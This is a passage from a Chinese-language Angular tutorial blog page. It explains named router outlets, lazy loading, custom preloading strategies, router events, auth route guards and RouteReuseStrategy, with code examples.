         &lt;!--  &lt;a class=&quot;nav-link&quot;  (click)=&quot;goTips()&quot;&gt;to tips&lt;/a&gt;   --&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
     &lt;router-outlet&gt;&lt;/router-outlet&gt;
     &lt;!--  取名为tip    --&gt;
     &lt;router-outlet name=&quot;tip&quot;&gt;&lt;/router-outlet&gt;
   &lt;/div&gt;
 </span><span class="token template-punctuation string">`</span></span>
<span class="token operator">...</span>
<span class="token comment">// 函数式跳转</span>
<span class="token function">goTips</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigate</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span>outlets<span class="token operator">:</span> <span class="token punctuation">{</span>tip<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'tips'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><ol start="2"><li>配置命名路由：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// router-study-routing.module.ts</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Routes <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'comments'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> CommentsComponent<span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'comment/:id'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> CommentComponent<span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">'tips'</span><span class="token punctuation">,</span>
    component<span class="token operator">:</span> TipsComponent<span class="token punctuation">,</span>
    outlet<span class="token operator">:</span> <span class="token string">'tip'</span> <span class="token comment">// 这里就是出口的名字</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ol start="3"><li>修改组件模板内容：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// tips.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-tips'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div class=&quot;tips&quot;&gt;
      &lt;p&gt;tips content!!!!&lt;/p&gt;
      &lt;div class=&quot;btn-group&quot;&gt;
        &lt;button class=&quot;btn btn-small btn-primary&quot; (click)=&quot;onOk()&quot;&gt;OK&lt;/button&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  changeDetection<span class="token operator">:</span> ChangeDetectionStrategy<span class="token punctuation">.</span>OnPush
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">TipsComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> router<span class="token operator">:</span> Router</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token comment">// 这里的关闭是直接从DOM中移除</span>
  <span class="token function">onOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigate</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span> outlets<span class="token operator">:</span> <span class="token punctuation">{</span> tip<span class="token operator">:</span> <span class="token keyword">null</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p><img src="/vuebloger/img/post/20210408135820568.gif" alt=""></p> <p>从最后的结果可以看出：</p> <ul><li>URL（http://localhost:4200/users/4(tip:tips)） 中包含一个主路由 users及第二个路由 (tip:tips)，出口名 tip和路径 tips；</li> <li>第二个路由会一直存在与DOM结构中，直到关闭；</li> <li>命名路由与其他路由组合使用，且相互独立。</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>命名路由跳转方式可以是 <code>[routerLink]=&quot;[{outlets: {tip: ['tips']}}]</code>或者 <code>this.router.navigate([{outlets: {tip: ['tips']}}]);</code>，销毁则设置成 null:<code>this.router.navigate([{ outlets: { tip: null }}]);</code></p></div> <h3 id="懒加载路由"><a href="#懒加载路由" class="header-anchor">#</a> 懒加载路由</h3> <ol><li>将子路由模块path设为空(''):</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// admin-routing.module.ts</span>
<span class="token punctuation">{</span>
  path<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span> 
  component<span class="token operator">:</span> AdminComponent<span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ol start="2"><li>在引入子路由模块的任意父级模块的路由配置文件中配置懒加载：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app-routing.module.ts</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Routes <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">loadChildren</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./components/router-study/admin/admin.module'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">m</span> <span class="token operator">=&gt;</span> m<span class="token punctuation">.</span>AdminModule<span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="预加载所有路由"><a href="#预加载所有路由" class="header-anchor">#</a> 预加载所有路由</h3> <p>预加载是指在程序加载完必要资源后，空闲时段预先加载其他资源。懒加载路由一般用于使用频率较低的组件，而预加载则用于使用频率较高的组件。angular本身提供了两种预加载策略：完全不预加载，这是默认值，以及预加载所有异步路由。当然，也支持自定义预加载策略。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// app-routing.module.ts
const routes: Routes = [
  {
    path: 'comments',
    loadChildren: () =&gt; import('./components/router-study/comment/comment.module').then(m =&gt; m.CommentModule)
  },
];
@NgModule({
  imports: [RouterModule.forRoot(routes, {preloadingStrategy: PreloadAllModules})], // 👈 预加载所有路由
})
// comment.mudule.ts
@NgModule({
  declarations: [CommentsComponent, CommentComponent],
  imports: [CommonModule],
  providers: [CommentService]
})
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h3 id="自定义预加载策略"><a href="#自定义预加载策略" class="header-anchor">#</a> 自定义预加载策略</h3> <p>我们可以在路由配置中设定一个 preload标识符来判定路由是否需要预加载。在全局生成一个新的 SelectivePreloadingStrategy服务：<code>ng g s services/SelectivePreloadingStrategy</code>,在生成的文件需要实现 PreloadingStrategy接口以及对应的 preload()方法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// selective-preloading-strategy.service.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SelectivePreloadingStrategyService</span> <span class="token keyword">implements</span> <span class="token class-name">PreloadingStrategy</span> <span class="token punctuation">{</span>
  <span class="token comment">// 记录预加载的模块</span>
  preloadedModules<span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">preload</span><span class="token punctuation">(</span>route<span class="token operator">:</span> Route<span class="token punctuation">,</span> <span class="token function-variable function">load</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>route<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> route<span class="token punctuation">.</span>data<span class="token punctuation">.</span>preload<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 使用预加载的条件</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>preloadedModules<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>route<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 最重要的就是返回这个方法</span>
      <span class="token keyword">return</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">of</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>修改预加载策略为我们自定义的这个：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app-routing.module.ts</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>RouterModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span>routes<span class="token punctuation">,</span> <span class="token punctuation">{</span>preloadingStrategy<span class="token operator">:</span> SelectivePreloadingStrategyService<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>给我们需要的预加载的路由配置 preload标识符：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app-routing.module.ts</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Routes <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">loadChildren</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./components/router-study/admin/admin.module'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">m</span> <span class="token operator">=&gt;</span> m<span class="token punctuation">.</span>AdminModule<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment">// canLoad: [AuthGuard],</span>
    data<span class="token operator">:</span> <span class="token punctuation">{</span>preload<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>如果你想在程序中获取有哪些路由启用预加载，也可以通过服务的方式获取到。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AdminDashboardComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> preloadStrategy<span class="token operator">:</span> SelectivePreloadingStrategyService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>preloadStrategy<span class="token punctuation">.</span>preloadedModules<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [&quot;admin&quot;, &quot;users&quot;]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="路由事件"><a href="#路由事件" class="header-anchor">#</a> 路由事件</h3> <p>Router在每次导航过程中都会通过 Router.events属性发出导航事件。这些事件的范围贯穿从导航开始和结束之间的多个时间点。导航事件的完整列表如下图所示：</p> <p><img src="/vuebloger/img/post/20210408140442767.jpg" alt=""></p> <p>任意组件中均可获取事件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> router<span class="token operator">:</span> Router</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span>events
      <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">events</span> <span class="token operator">=&gt;</span> events <span class="token keyword">instanceof</span> <span class="token class-name">NavigationStart</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> NavigationStart</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="路由守卫"><a href="#路由守卫" class="header-anchor">#</a> 路由守卫</h3> <p>路由配置里加路由守卫属性，然后编写相关守卫类，返回布尔类型，根据true和false决定是否允许进入和离开路由</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app-routing.module.ts</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Routes <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">loadChildren</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./components/router-study/admin/admin.module'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">m</span> <span class="token operator">=&gt;</span> m<span class="token punctuation">.</span>AdminModule<span class="token punctuation">)</span><span class="token punctuation">,</span>
    canLoad<span class="token operator">:</span> <span class="token punctuation">[</span>AuthGuard<span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// auth.guard.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ActivatedRouteSnapshot<span class="token punctuation">,</span> RouterStateSnapshot<span class="token punctuation">,</span> UrlTree<span class="token punctuation">,</span> CanActivate<span class="token punctuation">,</span> Router <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> LocalStorageUtil <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../utils/localstorage.util'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> AtrReuseStrategy <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../routereuse/atr-reuse-strategy'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">'root'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AuthGuard</span> <span class="token keyword">implements</span> <span class="token class-name">CanActivate</span><span class="token punctuation">,</span> CanActivateChild<span class="token punctuation">,</span> CanLoad <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span> <span class="token parameter"><span class="token keyword">private</span> router</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">canActivate</span><span class="token punctuation">(</span>
    route<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">,</span>
    state<span class="token operator">:</span> RouterStateSnapshot
  <span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token operator">|</span> UrlTree <span class="token operator">|</span> Observable<span class="token operator">&lt;</span>boolean <span class="token operator">|</span> UrlTree<span class="token operator">&gt;</span> <span class="token operator">|</span> Promise<span class="token operator">&lt;</span>boolean <span class="token operator">|</span> UrlTree<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// throw new Error(&quot;Method not implemented.&quot;);</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> LocalStorageUtil<span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigateByUrl</span><span class="token punctuation">(</span><span class="token string">'/p/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span>  AtrReuseStrategy<span class="token punctuation">.</span><span class="token function">deleteAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><h3 id="路由重用"><a href="#路由重用" class="header-anchor">#</a> 路由重用</h3> <p>路由在执行过程中对组件无状态操作，即路由离退时组件状态也一并被删除；当然在绝大多数场景下这是合理的。</p> <p>但有时一些特殊需求会让人半死亡状态，当然这一切都是为了用户体验；一种非常常见场景，在移动端中用户通过关键词搜索商品，而这样的列表通常都会是自动下一页动作，此时用户好不容易滚动到第二页并找到想要看的商品时，路由至商品详情页，然后一个后退……,列表数据又重回到了第一页。</p> <p>Angular 利用 RouteReuseStrategy 贯穿路由状态并决定构建组件的方式；当然默认情况下（DefaultRouteReuseStrategy）像开头说的，一切都不进行任何处理。</p> <h4 id="routereusestrategy"><a href="#routereusestrategy" class="header-anchor">#</a> RouteReuseStrategy</h4> <p>路由复用策略提供了一下方法：</p> <ul><li>shouldDetach 是否允许复用路由</li> <li>store 当路由离开时会触发，存储路由</li> <li>shouldAttach 是否允许还原路由</li> <li>retrieve 获取存储路由</li> <li>shouldReuseRoute 进入路由触发，是否同一路由时复用路由</li></ul> <p>用一种白话文像是这样：把路由 /list 设置为允许复用（shouldDetach），然后将路由快照存在 store 当中；当 shouldReuseRoute 成立时即：再次遇到 /list 路由后表示需要复用路由，先判断 shouldAttach 是否允许还原，最后从 retrieve 拿到路由快照并构建组件。</p> <p>下面我们来试试：
1、创建策略</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>import {RouteReuseStrategy, DefaultUrlSerializer, ActivatedRouteSnapshot, DetachedRouteHandle} from '@angular/router';
export class SimpleReuseStrategy implements RouteReuseStrategy {
    _cacheRouters: { [key: string]: any } = {};
    shouldDetach(route: ActivatedRouteSnapshot): boolean {
        return true;
    }
    store(route: ActivatedRouteSnapshot, handle: DetachedRouteHandle): void {
        this._cacheRouters[route.routeConfig.path] = {
            snapshot: route,
            handle: handle
        };
    }
    shouldAttach(route: ActivatedRouteSnapshot): boolean {
        return !!this._cacheRouters[route.routeConfig.path];
    }
    retrieve(route: ActivatedRouteSnapshot): DetachedRouteHandle {
        return this._cacheRouters[route.routeConfig.path].handle;
    }
    shouldReuseRoute(future: ActivatedRouteSnapshot, curr: ActivatedRouteSnapshot): boolean {
        return future.routeConfig === curr.routeConfig;
    }
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>定义一个 _cacheRouters 用于缓存数据（路由快照及当前组件实例对象）。</p> <ul><li>shouldDetach 直接返回 true 表示对所有路由允许复用</li> <li>store 当路由离开时会触发。按path作为key存储路由快照&amp;组件当前实例对象；path等同RouterModule.forRoot中的配置。</li> <li>shouldAttach 若 path 在缓存中有的都认为允许还原路由</li> <li>retrieve 从缓存中获取快照，若无则返回null</li> <li>shouldReuseRoute 进入路由触发，判断是否同一路由</li></ul> <ol start="2"><li>注册</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>providers<span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> RouteReuseStrategy<span class="token punctuation">,</span> useClass<span class="token operator">:</span> SimpleReuseStrategy <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>假设我们有这么一个路由配置：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>RouterModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
  <span class="token punctuation">{</span> path<span class="token operator">:</span> <span class="token string">'search'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> SearchComponent <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> path<span class="token operator">:</span> <span class="token string">'edit/:id'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> EditComponent <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>搜索组件用于搜索动作，并在根据搜索结果跳转至编辑页，保存后又回到最后搜索结果的状态,这个时候因为每个路由导航都放到了_cacheRouters，实现了简单的路由重用。</p> <h4 id="增强示例"><a href="#增强示例" class="header-anchor">#</a> 增强示例</h4> <p>这里给路由重用的组件增加了另外两个钩子，ngAttach和ngOnDetach两个钩子以更灵活使用：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>
  ActivatedRouteSnapshot<span class="token punctuation">,</span>
  DetachedRouteHandle<span class="token punctuation">,</span>
  RouteReuseStrategy
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ComponentRef<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token comment">// solution: https://github.com/angular/angular/issues/25521</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">DetachedRouteHandleExt</span> <span class="token keyword">extends</span> <span class="token class-name">DetachedRouteHandle</span> <span class="token punctuation">{</span>
